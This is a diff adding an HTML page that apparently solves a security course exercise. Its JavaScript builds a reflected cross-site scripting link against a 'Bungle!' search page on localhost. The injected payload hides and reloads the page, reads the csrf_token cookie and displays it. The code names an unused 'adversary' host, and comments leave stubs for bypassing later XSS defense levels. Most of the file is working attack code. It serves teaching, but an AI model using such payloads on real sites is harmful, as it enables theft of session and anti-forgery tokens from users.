@@ -1,0 +1,56 @@
+
+<html>
+    <head>
+        <meta charset="utf-8">
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+        <script>
+            function payload(adversary) {
+                function proxy(href) {
+                    $("html").load(href, function() {
+                        var cookieArray = document.cookie.split("; ");
+				        var cookieVal = "";
+				        for (var x = 0; x < cookieArray.length; x++){
+					    var token = cookieArray[x].split("=");
+					        if(token[0].startsWith("csrf_token")){
+						        cookieVal = token[1];
+					        }
+				        }
+                        alert(cookieVal);
+                        $("html").show();
+                        $("#").hide(); 
+                        
+                    });
+                }
+
+                
+                $("html").hide();
+                proxy("./"); 
+            }
+
+            function makeLink(xssdefense, target, adversary) {
+                if (xssdefense == 0) {
+                    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() +
+                        ";payload(\"" + adversary + "\");</script" + ">");
+                } else {
+                    // Implement code to defeat XSS defenses here.
+                    // if xssdefense = 1, 2, 3, 4
+                    // The xssdefense changes and based on its defense, you need to edit the returned url to get around these changes
+                }
+            }
+
+            var xssdefense = 0;
+            var target = "http://localhost/project2/";
+            var adversary = "http://localhost:31337/";
+
+            $(function() {
+                var url = makeLink(xssdefense, target, adversary);
+                $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+            });
+        </script>
+
+    </head>
+    <body class="vsc-initialized">
+        <h3></h3>
+    </body>
+</html>
